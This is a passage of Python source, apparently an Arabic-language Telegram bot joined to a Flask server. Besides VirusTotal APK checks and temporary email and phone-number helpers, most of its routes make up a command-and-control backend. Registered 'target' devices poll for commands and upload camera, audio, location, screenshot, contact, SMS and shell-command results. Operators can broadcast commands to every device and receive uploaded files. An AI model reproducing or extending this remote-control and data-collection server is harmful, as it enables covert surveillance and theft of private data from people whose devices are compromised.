            safe_send(chat_id, f"✅ تم استخراج النص ({len(pdf_text)} حرف).\n\nالآن اكتب سؤالك عن المحتوى:")
            return
        
        if state == "waiting_for_apk":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ أرسل ملف APK.")
                return
            
            safe_send(chat_id, "⏳ جاري فحص الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            
            result = analyze_apk(downloaded, file_name)
            
            if result.get('error'):
                safe_send(chat_id, f"⚠️ {result['error']}")
            else:
                msg = f"📦 **نتيجة فحص APK:**\n\n"
                msg += f"📌 **الملف:** {file_name}\n"
                msg += f"🛡️ **ضار:** {result.get('malicious', 0)}\n"
                msg += f"⚠️ **مشبوه:** {result.get('suspicious', 0)}\n"
                msg += f"✅ **آمن:** {result.get('harmless', 0)}\n"
                
                if result.get('malicious', 0) > 0:
                    msg += "\n🚨 **تم اكتشاف تهديدات!**"
                elif result.get('suspicious', 0) > 0:
                    msg += "\n⚠️ **يوجد عناصر مشبوهة**"
                else:
                    msg += "\n✅ **الملف يبدو آمناً.**"
                
                safe_send(chat_id, msg)
            
            user_states[chat_id] = None
            return
    
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)}")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    safe_send(message.chat.id, "🖼️ تم استلام الصورة.")

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        safe_send(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails(token)
    
    if msgs:
        response = "📬 **رسائل البريد المؤقت:**\n\n"
        for msg in msgs:
            response += f"📩 **من:** {msg['from']}\n"
            response += f"📌 **الموضوع:** {msg['subject']}\n"
            response += f"📝 **مقتطف:** {msg['preview']}...\n\n"
        safe_send(chat_id, response)
    else:
        safe_send(chat_id, "📭 لا توجد رسائل.")

# ===================== جلب أرقام مؤقتة =====================

def fetch_temp_numbers(limit=5):
    """جلب أرقام هواتف مؤقتة"""
    results = []
    sources = [
        ("https://receive-sms-online.cc/", "US"),
        ("https://www.temporary-phone-number.com/", "US"),
        ("https://www.textnow.com/", "US"),
        ("https://sms-online.co/receive-free-sms/", "US"),
        ("https://www.freeonlinephone.org/", "US")
    ]
    for base_url, default_country in sources:
        try:
            response = REQUEST_SESSION.get(base_url, timeout=15)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                country = default_country
                country_names = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Spain', 'Italy', 'Egypt', 'UAE', 'Saudi']
                for name in country_names:
                    if name in text[max(0, text.find(match)-50):text.find(match)+50]:
                        country = name
                        break
                results.append({
                    'number': cleaned,
                    'country': country,
                    'source': base_url,
                    'status': 'available'
                })
                if len(results) >= limit:
                    break
            if len(results) >= limit:
                break
        except Exception as e:
            continue
    return results

# ===================== تحليل APK =====================

def analyze_apk(file_content, file_name):
    """تحليل ملف APK باستخدام VirusTotal"""
    if not VIRUSTOTAL_API_KEY:
        return {"error": "مفتاح VirusTotal غير مضبوط"}
    
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = REQUEST_SESSION.post(url, headers=headers, files=files, timeout=60)
        
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = REQUEST_SESSION.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    return {
                        'malicious': stats.get('malicious', 0),
                        'suspicious': stats.get('suspicious', 0),
                        'harmless': stats.get('harmless', 0),
                        'undetected': stats.get('undetected', 0)
                    }
        return {"error": "فشل فحص الملف"}
    except Exception as e:
        return {"error": str(e)}

# ===================== المسارات الأساسية =====================

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/ping')
def ping():
    return 'pong'

@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        
        device_id = data.get('device_id')
        chat_id = data.get('chat_id', 0)
        name = data.get('name', 'Unknown Device')
        device_type = data.get('type', 'unknown')
        ip = data.get('ip')
        os_name = data.get('os')
        
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        
        register_target(device_id, chat_id, name, device_type, ip, os_name)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"register_device error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        
        update_target_status(device_id, 'online')
        
        data_type = data.get('type', 'unknown')
        content = data.get('data', {})
        ip = request.remote_addr
        
        save_collected_data(device_id, data_type, content, ip)
        
        if data_type in ['camera', 'audio', 'location', 'screenshot', 'contacts', 'sms', 'shell_result']:
            notify_admin(f"📱 **بيانات من جهاز {device_id}**\n📂 النوع: {data_type}")
        
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"submit_result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        
        command = get_pending_command(device_id)
        if command:
            return jsonify({'cmd': command, 'param': ''}), 200
        return jsonify({'cmd': '', 'param': ''}), 200
    except Exception as e:
        logger.error(f"get_command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/broadcast_command', methods=['POST'])
def broadcast_command():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        
        command = data.get('command')
        if not command:
            return jsonify({'error': 'command required'}), 400
        
        targets = get_all_targets()
        count = 0
        for target in targets:
            add_command(target['device_id'], command)
            count += 1
        
        notify_admin(f"📢 أمر تم بثه لـ {count} جهاز: `{command}`")
        return jsonify({'status': 'success', 'devices_count': count}), 200
    except Exception as e:
        logger.error(f"broadcast_command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        
        device_id = data.get('device_id')
        command = data.get('command')
        
        if not device_id or not command:
            return jsonify({'error': 'device_id and command required'}), 400
        
        add_command(device_id, command)
        notify_admin(f"📨 أمر مرسل للجهاز `{device_id}`: `{command}`")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"send_command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/collect_data', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
        
        session_id = request.remote_addr + '_' + str(time.time())
        data_type = data.get('type', 'unknown')
        content = json.dumps(data, ensure_ascii=False)
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (device_id, data_type, data, ip, created_at)
                         VALUES (?, ?, ?, ?, ?)''',
                      (session_id, data_type, content, ip, datetime.now().isoformat()))
            conn.commit()
        
        notify_admin(f"📋 **بيانات جديدة**\n📂 النوع: {data_type}\n🌐 IP: {ip}")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"collect_data error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/upload_files', methods=['POST'])
def upload_files():
    try:
        if 'files' not in request.files:
            return jsonify({'status': 'error', 'message': 'No files'}), 400
        
        files = request.files.getlist('files')
        if not files:
            return jsonify({'status': 'error', 'message': 'No files selected'}), 400
        
        ip = request.remote_addr
        session_id = ip + '_' + str(time.time())
        saved_files = []
        
        for f in files:
            if f.filename == '':
                continue
            filename = datetime.now().strftime('%Y%m%d_%H%M%S') + '_' + f.filename
            filepath = os.path.join(UPLOAD_DIR, filename)
            f.save(filepath)
            
            with get_db_connection() as conn:
                c = conn.cursor()
                c.execute('''INSERT INTO collected_data (device_id, data_type, data, ip, created_at)
                             VALUES (?, ?, ?, ?, ?)''',
                          (session_id, 'uploaded_file', json.dumps({'filename': filename, 'path': filepath}), 
                           ip, datetime.now().isoformat()))
                conn.commit()
            
            saved_files.append(filename)
            notify_admin(f"📎 **ملف مرفوع**\n📄 الاسم: {filename}\n🌐 IP: {ip}")
        
        return jsonify({'status': 'success', 'saved': saved_files}), 200
    except Exception as e:
        logger.error(f"upload_files error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ===================== Keep-Alive Thread =====================
def keep_alive():
    if not SERVER_URL:
        return
    while True:
        time.sleep(300)
        try:
            req_lib.get(f"{SERVER_URL}/ping", timeout=10)
            logger.info("✅ Keep-alive ping")
        except Exception as e:
            logger.error(f"❌ فشل Keep-alive: {e}")

# ===================== تشغيل البوت =====================
if __name__ == "__main__":
    bot.remove_webhook()
    if USE_WEBHOOK and SERVER_URL:
        webhook_url = f"{SERVER_URL}/webhook"
        try:
            success = bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET)
            if success:
                logger.info(f"✅ Webhook تم تعيينه: {webhook_url}")
            else:
                logger.warning(f"⚠️ فشل تعيين Webhook.")
        except Exception as e:
            logger.error(f"❌ خطأ في تعيين Webhook: {e}")
    else:
        logger.info("🔄 تشغيل البوت عبر Polling...")
    
    if SERVER_URL:
        keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
        keep_alive_thread.start()
        logger.info("🔄 تم بدء Keep-alive.")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
